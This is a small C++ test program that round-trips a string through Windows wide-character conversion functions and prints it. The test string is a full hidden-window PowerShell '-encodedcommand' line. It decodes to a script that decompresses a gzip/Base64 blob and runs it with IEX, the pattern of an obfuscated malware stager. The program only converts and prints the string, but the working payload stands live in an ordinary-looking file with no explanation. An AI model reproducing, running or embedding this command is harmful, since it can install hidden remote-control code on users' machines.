// test.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>
#define MAX_CMD_SIZE 10000
#define INITID_MAX_LENGTH  (MAX_CMD_SIZE * sizeof(wchar_t))
int main()
{
    wchar_t cmd[MAX_CMD_SIZE]{};
    char data[INITID_MAX_LENGTH]{};
    const char* t = "powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEALwA2ADEAWABiAFgATwBpAHkAaABMACsASABIADgARgBIADEASwBsAFYASQB4AEIAOABTADEANwBhAHEAcwBXAEIAUgBRAFUAVgBGAEMAagA1AHEAUgBTAEEANAB5AEsANABaADEAQgBKAFcAZgAzAHYANQA4AEcATgBTAGQANwBOAHIAbAAzAHEAKwA1AE4AbABaAFYAaAA2AE8ANQA1ACsAcABsAG4AZQBoAG8AZABrADEAdQBkAFIATABaAEoARgBOAC8AQwAxAE8AMABjAFIANwBIAHQAZQAxAFMAdABVAEwAagBtAGYAWQBsAFEAWAA2AGwAdgB4AGMASQA2ADgAVQB5AFMAVABXAGUARAA1AHcAMABtAHoAMABIAGsAbQA4AC8ASQBzAGkASQBjAHgAOQBSAGYAaABhAHMAeABpAHAAQgBMAGwAYQA3ADMASwBIAHAAMgBmAFMAdAB4AGMASgBuAEsASAB6AEoARABiAEMAVQBSAHAAcQArAHUAQwBsAGYANQBWAE8ATABGAGEASQAyAGYAUABVAFQAcwBQAFgANQAyAE0AZABuADYAVgBnAHcATABsAFIANgA1AEkATwBCADkARgA5AG4AZQAwADUAYwB2ADMAUwBTAEsAcwBFAGQATwB6ADUAVQBlAEoAbAB3AGMAWQA5AGQAdwBiAEIAeQBYAGEATwBvADcAOQBiAEQARgBFAGIANABkAEcAVAB0AHMARQB1AG8AdgA2AHYAcQA1ADAAbgBOADgAQQB6AGwAbgBzADcAUwBMAHoAQwAwAGsAeABIAGwAVwA5AG0ANwBvAG0AeQBqAEwAbwBLAEkASABqAGsAMQBLAHgAVAAvAC8ATABOAEsAUAB0ADkAVwBuAGkAaABBAG0AeQBJAGwATABSAFQAMgBOAEMAWABZAHIAbAB1AE0AVQBhAGUAbwBIAG4AUwAwADQAVABRAE4AYwBLAGkAcQAyAEcAZgBtAHgAdgB5AGEAVgBCADkAdABqAGEANQBWAFoAagBsADcATgB3AFMAcwBuADcARQBYADYAbgBOAGsAbQBRAEoARABIADUAMABsAG0AVQBVADgAKwBwAFMASQBNAHgAOABBAE4AZAArAEsAdwBXAEsAWQBlAHMALwBVAGUAbgA1ADYAbwBiADIAOQBvAHQATQBRAGoAdABvAHMAcgBrAGsAZAB3ADUAQQBjADYAagB2AGEAMgBpAGUATgBLAEgAMwBtAFcAZwB6AFcAOABCAHIAZABpAEQATgB2AG4AYgBZAG8AMABnAEkAZwB3AFMAUwBLAFAAdQBtAEEAQgB2ADcAMwAvAGcAawB2AFgAWAB1AEkANABaAFkAagA3ACsATAB0AHgAbgAwAG8AcQBQAGwAegBJAC8AVgAyAG4AMABuAHMAbgBzAEIAcQBUAGkAQwA2AGYATgBmAEUANwBkAEMAaQA1AGIAawA3AGgASQBKADEAZgAwAEwAOABUAEYAdwAxAC8AdgB3AGkATQBMAHYAdwBvAGYAQwBCAFYAQwB6AHQANABnAHcAaAArAEoAcwBEAHYATwA2ADAAVwByAHEANABlADgAeQBHAEcAZgBFAHAAagBQADcAWgB6AHYANgA4AFUAVQA2AFkAVQBBAEkARwBJAEgANgBYAFoAZABrADYAagBCAE4ATgBQAC8AKwB6AFAAYQBkAG0ATABaADEAegArAE4ARgBEADEANABuAFgAMgBPAFcAMwBQAEMAYwBkAFgANgBuAEgAdQAyADkAWgBUADQAWQBvAHUAbgBOAFcAVAB6AFQAOABiAGkAZQAxAFkATwBNAHIAZQBmADMANABhAGUATAB5ADIAUABjAHkAbgBIAG4ASgB0ADgAeQBMADQAMABrAGQANwBoAHQAYwBPAHoAdgBtAG8AWABNAHgAVQB3AEYAawBxAG4AbAA5AGcAaQB6ACsAegBVADgAdwBJAGYAZgB6AFYAVABYAEIAdAA4AHUAYgBiAE8AWQBIAGoAVABOAGoAMwBHAEYAQwBCAEoATwBpAGYAdwBaAHoAMgBzAEYAUwBVAFAAQQBXADcAdwBOAC8AcABHAFcAUgA2AHYAWQBaAGoAaABpAC8AVwA1ADYATwBWAFgAbABiAFAAbgBqAE0AdABkAHgAMABVAHgAMgBWAHEAbgBNAEEANQBOADgAdQBVAGoAcABHAEQAcgBUAEwARgBlAGIARgA5AGYAcwBVAGwAeABNACsASAB4AFgALwBnAEsAbwBsAEQAYgBCAFAARgA1AEIATAB1AGkAZgA2AEEAMAB2AFAAUwBYAGQAKwBEAEUANQBPAFkAcwBMAHQAQQB3ADEAUQBQAHMARwBrAGoASgAyAE8AbABUAFAAVgB0AEMAMwBkAFMAMwBkADUAYwBJAEIAUQAvADUASwBTAEwASABBAGUATwBIAEUAVABhAHcANQA3AEEAVABNAGEARgBUAGoATABOAFIARgBiADUAMwAvAHEAZwBLAHoAbwBtAGsAaABzADQAMgBBAFgAcgB2AEEAcQBKAEQAdABwAEEAegBUAG0AZgBxAEYAeAB1AGEASQBPAHQANABuACsAQQBmAFQAawBuAHAAMABPAFIAYwBYAFUAaAA2AFIAMQBvAEUASQBEAHUAKwBLAFIATQB6AGUAMgBJAFEARgAwAHIAbABuADgAUgAzAHYAOABHADcAKwBjAFMAOAB4AFAATQBiAG8AVABQAEcAMQBuAEsARAArAEoAagBKAHkAWABaAGMAYwBrAHQAegBlAHgAeQArAGYAcgBHAFoAYwA1AGMAUgBJAEEAMQBNAGYATABkAEQAbwBwAHgAcwA2ADcAbgBaAGEAeABVAFoATgB0AEoASwBLAFgASwBiAHQASwBNAGUAcwBKAGUANwBJAGQAOQBZAFEAcQAvAFAAZgB6AFkAVQBCAFMARwBRADEAawBMAE8AdAByAFEARgBKAEwAUgB1AE0ALwBJAGEAMgBuAFMANQB1AHYASgBJAFoARwBTAGEAWQBkAGgAUgBRAGIAcwBYAHMATwBlAHMASgBiADIASQAzADkAWgBUAGQAeAA2ADEAUQBxAGsAdgBRAHAAegBjAFMAdgBzAHgANwB5ADAANQA3AGwAKwBMAGYAVABGADUAcwBhACsAUAA4AGMANQArAFUAKwBNAFEAOQBWAFkAUwBHAEwATAA2AEkAbgAxAC8AagB3AFcATQAvAHUAKwB0AE8AKwBJAFkAZgBmAGUAaAAvAEcAZAB0AE8ALwA2AE0AdgBpADEAbQA0AEgAWABPAFYAaAAxAEwATQBoAE4AdgBCAGkAYQBCADUAYQAwAE0AZABvAGMAMAA4AEgAOABSAG0AZQBxAHYAWABtAHEARAB1AGQAQwBvAE8AcQBlAE4AVABTAHEARQAxAEYAVwBYADIAcwBDAE8AVABKAFcAWAAyAE0AcwBJAFYANQBaADgAMQBCAGcAeAA4AFkAZwBnAEQAdwBsAGQAcQBNADMAUABUAG4AVgA5AFUANQBxAHYAcABEAFgATABIAGUAegByAHcANgB0AFEAZABoAHUAVwBLACsAMQBWAEYAVAByAHcATQBOAFIAVAA1AFgAdABzAG0AawBkAHoAWQBWADQATQBCAGYAcQBNAE8AMAB2ADEAUgA3AEUARABaAE8ASABUAGIAMgB2ADYAQwB6AEUAMQBxADMAagB3AFoAcgBGAEkAMwBsAEsAbAB1AHcAWQB1AGYAVQAwADkAZQBwAGQAYQBTAGMAZABoADIAWgBBADUAZwB1ADUARwBhAEcAMABHAHcAeAB0AGIASABUAFcASgBQAE8AVgBoADYAdQBOAGYAQwArAFEARQB6ADUAZAAxADEASQBMAFkAagB2ADkASwBUACsAQQAyAEYANQBYAFUAUQBBAFAAYQBvAGgANABCAGoAYQBEADIASQBaAFkANwBTAGkAVQBiAEcAVwBYAE4AbgBjAG0AcQB4ADYAVQBWAFMAMgBRAE4AWABzADAAQwBHAFIAMAA0AE4AeABSAGIAZAB5ADUARAAxAGIANwAvAHMAbwBZAGUAYQBnADMAWgBBAFUAbAA2AEkAMQBDAG8AYgBtADQAYQBSAC8AUgBMAEkAeQAyAHoARwBwAEgAdABFAG0AaQB0AEYAYQB6AGQASwBsAHEANgBZAGoAUgBCAHMASgBTAGEAWQB2AEoAZgBXAHYAagBiACsAWQBMAHcAeAA3ADcAaQBMAHYAQgAwAGUANABPADYAegBvAGEAQQBJAGwAMQBWAFEAOABrAGQAagBYAFIASABHAEcAMABmAE4ARgA2ADAANwBtADUANABtAG8ATgA1AFcARQBXAGoASwBlAE0AcABJAGcAYgBaAHMAbwBkAEMARABjAFYARwB0AE8ASgBZAHcAMABtAHMALwB0AGUAagAxAE0AVABzAHgAZQA0ADMARgBHAGEAOABwAHEAeQA1AEYAaAB0AE0ASgAxAFoAeQBsAHoAawBlAEcATgBoADgAdQBLAEUAMABjAEMARwBuAGMAMgBDAHYAdgBaAFMAWABmAEMAZABtAFMAbwBjAC8ARwBTAGcAagA3AGYAdQBYAFcAZgBtAGQARABIAFIAWAB1AFkAMQA1AFoARABXAFcAMQBHADQATQBWAG0AcABIAGEAOABmAHAASABCAFMAdgBSAHYATQBWADUAegBJAHgAaQBwAHUAQgBXAGsAYwBOAHMAYwBPAGIAdwBZAEwAcAB0AHIAUwBRAG0AWABmAGEAMABDAHAAYgByAE4AQgBFAE8ANABOAEYAWABPAEwAZwBXAHgANQA1AEkAWgB4AE4AVgBkAFYANwBuAHgAOQB3ADEAZwA0AE4AQgAyAGUAbQA5AHcAWQBjADUAVgBmAE4AZQA0AFgAQgB6AGYAbwBQAE8AaQA5AHgAVABHAHEAVABtAFQAYgBWAGQAbABsAHQAUwAzADIAUgB5AHYASgBhAEkAMwBhAGYAUwA2AFMAeABpAHkAVAA5AHAATwB4AHYANQBaAGoAZABZAHkAWABSAEoAOABSAHUAegBxAE4AVgA3AFUANwB1ADIASAB5AGcAcgBoADkAZABhAE0AMQBTAGgAOQBxADEAVgBmAHoAWgByAGoAcwBqAHUATQB1AE4AawBkAHIAVwBXAG8ANAAvAEUAQwBlAFMARwBNAGsAbQAwAFkATABMAHkAYgBNAHcATgBSAFkAagA5AHQANwAwADgATgBRAFQATwBUADAAWgBkAHMAVABwACsAMgBHADcAeQByAFQAQgAvAG4AUQBiAHcAdwBSADQAcQAzADIAZwB5AGEANQA3AEkAMgBHAG0AMQBQAGIANQBTAGUARAAyAG0AdwBUAEMATQB6AEwAZgBwADkAVQBsAGMAZwBiADMAVQBtAGQASgB1AG8AbABUAGUAMwBvADcAQwBOAGIASABUAEkATgAxAEwARgBBAHAALwBxAEQATwBwAFIAZQBRAGMAOQBNAHYASgBOAHEAeQBzADQAUwBTAEcAdgBMADgAagAzAFEANABjAEUARgB2AFkAQwBPADcAQgB0AFAAUABvAFEAeAA2AEQAUgBWAGUAQwBsAFYATQA2ADAAZQBDAFkAbwA2AHUAVgBhAHIAYQB5AGYAcwBUAHUAegA2AHcATgBqAE4ANAAxAFcAcgByAGkAUQBEAGwAcgB5AGEAdwB0AGIAWABlAEUAMgBhADkAdwA2AE0ATABtADUATgBWAGQAZwBLAFMARABwADYAOQAzAHAARAArAHAAcABWAHAATABVAGYAUQBZADkAeAB6AE8ANwB0AFAAeQBqADQAZgArAHMAUQA2AHEAMwBtAFEASwBXAEIASQBwAGIATgAzADkAegBRADIAZAAzAC8AOQB1AGIAeAArAHYAaAAwADYAZABYAGUAbgBtACsATgBJADAAUgBqAEcAMQBuADkAeQB0AC8AcwAwAGIAdQBxADkAVgBrAEQAcABLAEEAbwAzAGkASQBIAHEAaABrADAATQBaAGMAcgBTAFAAUQBqADgAZAB5AEsAagBIADAANwA4AHkAaQBWAFAAdQA2AGUAWAAzAEQAawBZAFEAYwA2AFMAKwBnADkATAA0AFcAYgBjAHgAegBmAHoASgBxAG4AVAA3AG8AWQBhAE8AVgBPAEQAZABZAFQAWABGAEEAegBHAEwASwAxAEQAMABjADAAOQBXAFkASQBIAGQATQBwAEoAeQBOAFoAcgAvAE0ARwA0ADUAegBoAHAAYwArADYARwBIADcANQBzAG8ATAAwAHkAdQA5AEkASABHAEoAdgBRADcAWgBsAGkAagBtAHkARABNAE4AawAvACsAcwBNAFgAZgBoADkAVwByAHAAKwBrAEoAYgBlAHcAcABXAHoAQgB1AHMAZABrAHYAYwByAE8AZgBsAEsAOQBKAG4AOQBLAFAARgBjAC8ASAAvAGMAZwBKADgAVwAvAGUALwBVAFoAdQBUAGwAUABkAG8AYgBkAFQAbQBnAGoALwBtAGkAQwA4AFYAdgBoAFkASwAwAHAAdAA3AE4AeAAvAFkAcgBmAEkASABnAGsARwByAG4AMgBvAHQAQgA2AHUAUgAyADUAeAB2AHcAdQBaAEwAZgB2ADYAVgByAFIARgBPAFMAcwBLAEMAdQBFAGYAVwBEAHUAbwBYADAAdQBKAGkAdAB3AFQAZABMAHQARQBtAHkAeQA1AGcANgBmAFkASgA5AHAAdwA3AEkAUABqAGwAKwBwAHoAUgBzAFkAbQBpAGgAYgAyAFgAZgBBAEoAVgBpADYASwBtAHkAMABIAG0AUQB6AEIAagBtAC8AZwBaAFUAYQA4AGIAUgAwAHcAMABBAEEAQQA9AD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=";
    //t转为宽存进cmd
    int a = MultiByteToWideChar(CP_UTF8, 0, t, strlen(t), cmd, MAX_CMD_SIZE - 1);
    cmd[a] = L'\0';
    //cmd反转回来存进data再打印
    
    std::cout << "wcslen cmd:" << wcslen(cmd) << std::endl;//7510
    std::cout << INITID_MAX_LENGTH << std::endl;
    WideCharToMultiByte(
        CP_UTF8, 0,
        cmd, -1,  // 自动计算长度，包含终止符
        data, INITID_MAX_LENGTH,
        NULL, NULL
    );
    std::cout << "data: " << data << std::endl;
    
}
